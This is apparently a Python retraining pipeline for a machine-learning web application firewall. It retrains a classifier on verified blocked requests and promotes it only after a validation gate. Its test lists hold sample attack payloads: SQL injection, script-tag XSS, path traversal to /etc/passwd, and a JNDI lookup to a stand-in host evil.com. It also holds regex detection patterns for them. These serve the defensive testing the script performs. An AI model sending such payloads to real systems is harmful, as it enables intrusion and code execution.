import sqlite3
import pandas as pd
import numpy as np
import joblib
import os
import re
import onnxruntime as rt
from scipy.stats import entropy
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.preprocessing import StandardScaler
from sklearn.ensemble import RandomForestClassifier
from scipy.sparse import hstack
from skl2onnx import convert_sklearn
from skl2onnx.common.data_types import FloatTensorType

print("=== WAF Self-Healing Pipeline Initiated ===")

FEEDBACK_BOOST_FACTOR = 100
VERIFIED_STATUSES = (
    "VERIFIED_NORMAL",
    "VERIFIED_ATTACK",
    "TRAINED_NORMAL",
    "TRAINED_ATTACK",
)
MODELS_DIR = os.path.join(os.path.dirname(__file__), "..", "models")
LIVE_ARTIFACTS = {
    "vectorizer": os.path.join(MODELS_DIR, "tfidf_vectorizer_v2.pkl"),
    "scaler": os.path.join(MODELS_DIR, "standard_scaler_v2.pkl"),
    "model": os.path.join(MODELS_DIR, "waf_brain_v2.onnx"),
}
CANDIDATE_ARTIFACTS = {
    "vectorizer": os.path.join(MODELS_DIR, "candidate_tfidf_vectorizer_v2.pkl"),
    "scaler": os.path.join(MODELS_DIR, "candidate_standard_scaler_v2.pkl"),
    "model": os.path.join(MODELS_DIR, "candidate_waf_brain_v2.onnx"),
}
PROMOTION_NORMALS = [
    "http://localhost:8080/tienda1/imagenes/nuevo_logo.png",
    "http://localhost:8080/tienda1/imagenes/nuevo_logo.png HTTP/1.1",
    "GET http://localhost:8080/tienda1/imagenes/nuevo_logo.png HTTP/1.1\n",
    "http://localhost:8080/tienda1/index.jsp HTTP/1.1",
    "http://localhost:8080/tienda1/publico/carrito.jsp?checkout=true",
]
PROMOTION_ATTACKS = [
    "http://localhost:8080/login?user=admin' OR 1=1 --&pwd=x HTTP/1.1",
    "http://localhost:8080/search?q=<script>alert('XSS')</script> HTTP/1.1",
    "http://localhost:8080/tienda1/publico/../../../../etc/passwd HTTP/1.1",
    "http://localhost:8080/api?token=${jndi:ldap://evil.com/exploit} HTTP/1.1",
]

# --- 1. Utility Functions (Must match exactly) ---
def calculate_scipy_entropy(text):
    if not text: return 0.0
    probs = pd.Series(list(text)).value_counts() / len(text)
    return float(entropy(probs, base=2))

def sql_keyword_count(text):
    if not text: return 0
    pattern = r'\b(SELECT|UNION|DROP|INSERT|UPDATE|DELETE|OR|AND|FROM|WHERE|EXEC|CAST|CHAR|DECLARE)\b'
    return len(re.findall(pattern, text, re.IGNORECASE))

def digit_ratio(text):
    if not text: return 0.0
    return sum(c.isdigit() for c in text) / len(text)

def uppercase_ratio(text):
    if not text: return 0.0
    letters = [c for c in text if c.isalpha()]
    return sum(c.isupper() for c in letters) / len(letters) if letters else 0.0

def has_attack_signature(text):
    if not text:
        return False
    patterns = [
        r"(?i)(?:^|[^a-z])or[^a-z]+['\"]?\d+['\"]?\s*=\s*['\"]?\d+",
        r"(?i)union\s+select",
        r"(?i)drop\s+table",
        r"(?i)insert\s+into",
        r"(?i)<\s*script",
        r"(?i)\$\{\s*jndi\s*:",
        r"(?i)(?:\.\./|%2e%2e%2f)",
        r"(?i)/etc/passwd",
    ]
    return any(re.search(pattern, text) for pattern in patterns)

def build_feature_row(raw_request, vectorizer, scaler):
    numeric = pd.DataFrame([{
        'length': len(raw_request),
        'entropy': calculate_scipy_entropy(raw_request),
        'sql_kw_count': sql_keyword_count(raw_request),
        'digit_ratio': digit_ratio(raw_request),
        'uppercase_ratio': uppercase_ratio(raw_request),
    }])
    return hstack([
        scaler.transform(numeric),
        vectorizer.transform([raw_request]),
    ]).toarray().astype(np.float32)

def validate_candidate(vectorizer, scaler, model_path):
    session = rt.InferenceSession(model_path, providers=['CPUExecutionProvider'])
    input_name = session.get_inputs()[0].name
    output_names = [output.name for output in session.get_outputs()]
    failures = []

    for payload in PROMOTION_NORMALS:
        features = build_feature_row(payload, vectorizer, scaler)
        outputs = session.run(output_names, {input_name: features})
        pred = int(outputs[0][0])
        if pred != 0:
            failures.append(f"normal failed: {payload}")

    for payload in PROMOTION_ATTACKS:
        features = build_feature_row(payload, vectorizer, scaler)
        outputs = session.run(output_names, {input_name: features})
        pred = int(outputs[0][0])
        if pred != 1:
            failures.append(f"attack failed: {payload}")

    return failures

def promote_candidate():
    for path in LIVE_ARTIFACTS.values():
        backup_path = f"{path}.bak"
        if os.path.exists(path):
            if os.path.exists(backup_path):
                os.remove(backup_path)
            os.replace(path, backup_path)

    for key, candidate_path in CANDIDATE_ARTIFACTS.items():
        os.replace(candidate_path, LIVE_ARTIFACTS[key])

# --- 2. Extract Verified Logs from Database ---
print("Fetching newly verified threat intelligence...")
db_path = os.path.join(os.path.dirname(__file__), "..", "waf_quarantine.db")
conn = sqlite3.connect(db_path)
placeholders = ",".join("?" for _ in VERIFIED_STATUSES)
query = f"SELECT id, request_payload, status FROM blocked_requests WHERE status IN ({placeholders})"
new_data_df = pd.read_sql_query(query, conn, params=VERIFIED_STATUSES)

poisoned_normals = new_data_df[
    new_data_df["status"].isin(["VERIFIED_NORMAL", "TRAINED_NORMAL"])
    & new_data_df["request_payload"].apply(has_attack_signature)
]
if not poisoned_normals.empty:
    ids = [int(row_id) for row_id in poisoned_normals["id"]]
    print(f"Found {len(ids)} contradictory VERIFIED_NORMAL row(s) with attack signatures. Marking REVIEW_REQUIRED.")
    conn.executemany(
        "UPDATE blocked_requests SET status = 'REVIEW_REQUIRED' WHERE id = ?",
        [(row_id,) for row_id in ids],
    )
    conn.commit()
    new_data_df = new_data_df[~new_data_df["id"].isin(ids)]

conn.close()

if new_data_df.empty:
    print("No new verified logs found. Model is up to date. Exiting.")
    exit()

# Map the text statuses to integer labels
new_data_df['Type'] = np.where(new_data_df['status'].isin(['VERIFIED_ATTACK', 'TRAINED_ATTACK']), 1, 0)
new_data_df.rename(columns={'request_payload': 'full_request'}, inplace=True)
new_data_df.drop(columns=['id', 'status'], inplace=True)

print(f"Found {len(new_data_df)} new verified records. Injecting into baseline dataset...")

# --- 3. Merge with Foundation Dataset ---
# Load your original CSIC dataset (ensure this CSV is in the 'data' folder)
data_path = os.path.join(os.path.dirname(__file__), "..", "data", "csic_database.csv")
baseline_df = pd.read_csv(data_path)
majority_class = baseline_df['classification'].value_counts().idxmax()
baseline_df['Type'] = np.where(baseline_df['classification'] == majority_class, 0, 1)
baseline_df['full_request'] = baseline_df['URL'].fillna('') + baseline_df['content'].fillna('')
baseline_df = baseline_df[['full_request', 'Type']]

# Add a few boring static assets as stable anchors so the model does not overreact to image paths.
known_normal_df = pd.DataFrame({
    'full_request': [
        'http://localhost:8080/tienda1/imagenes/nuevo_logo.png',
        'http://localhost:8080/tienda1/imagenes/nuevo_logo.png HTTP/1.1',
        'GET http://localhost:8080/tienda1/imagenes/nuevo_logo.png HTTP/1.1\n',
        'http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1',
    ],
    'Type': [0, 0, 0, 0],
})
new_data_df = pd.concat([new_data_df, known_normal_df], ignore_index=True)

# Oversample feedback so a correction is visible immediately after one retrain.
boosted_new_data = pd.concat([new_data_df] * FEEDBACK_BOOST_FACTOR, ignore_index=True)
combined_df = pd.concat([baseline_df, boosted_new_data], ignore_index=True)

# --- 4. Rebuild the Feature Matrix ---
print("Re-compiling feature extraction matrix...")
numeric_features = pd.DataFrame({
    'length': combined_df['full_request'].apply(len),
    'entropy': combined_df['full_request'].apply(calculate_scipy_entropy),
    'sql_kw_count': combined_df['full_request'].apply(sql_keyword_count),
    'digit_ratio': combined_df['full_request'].apply(digit_ratio),
    'uppercase_ratio': combined_df['full_request'].apply(uppercase_ratio)
})

# Re-train Preprocessors on the entire new dataset
vectorizer = TfidfVectorizer(analyzer='char', ngram_range=(1, 3), max_features=1000)
scaler = StandardScaler()

X_tfidf = vectorizer.fit_transform(combined_df['full_request'])
X_num_scaled = scaler.fit_transform(numeric_features)
X_final = hstack([X_num_scaled, X_tfidf])
y = combined_df['Type']

# --- 5. Retrain the Brain ---
print("Training WAF Brain v2.0...")
model = RandomForestClassifier(
    n_estimators=150, max_depth=25, min_samples_leaf=2,
    class_weight={0: 1, 1: 2}, random_state=42, n_jobs=-1
)
model.fit(X_final, y)

# --- 6. Export the Upgraded System ---
print("Exporting upgraded assets to 'models' directory...")
joblib.dump(vectorizer, CANDIDATE_ARTIFACTS["vectorizer"])
joblib.dump(scaler, CANDIDATE_ARTIFACTS["scaler"])

feature_count = X_final.shape[1]
initial_type = [('float_input', FloatTensorType([None, feature_count]))]
onnx_model = convert_sklearn(model, initial_types=initial_type)

with open(CANDIDATE_ARTIFACTS["model"], "wb") as f:
    f.write(onnx_model.SerializeToString())

print("Running promotion gate...")
failures = validate_candidate(vectorizer, scaler, CANDIDATE_ARTIFACTS["model"])
if failures:
    print("Promotion gate failed. Live model was not changed.")
    for failure in failures:
        print(f"  - {failure}")
    raise SystemExit(1)

promote_candidate()

db_path = os.path.join(os.path.dirname(__file__), "..", "waf_quarantine.db")
conn = sqlite3.connect(db_path)
conn.execute("UPDATE blocked_requests SET status = 'TRAINED_NORMAL' WHERE status = 'VERIFIED_NORMAL'")
conn.execute("UPDATE blocked_requests SET status = 'TRAINED_ATTACK' WHERE status = 'VERIFIED_ATTACK'")
conn.commit()
conn.close()

print("\nSuccess! Candidate passed the promotion gate and replaced the live v2 assets.")
print("The API will hot-reload the updated model on the next request.")
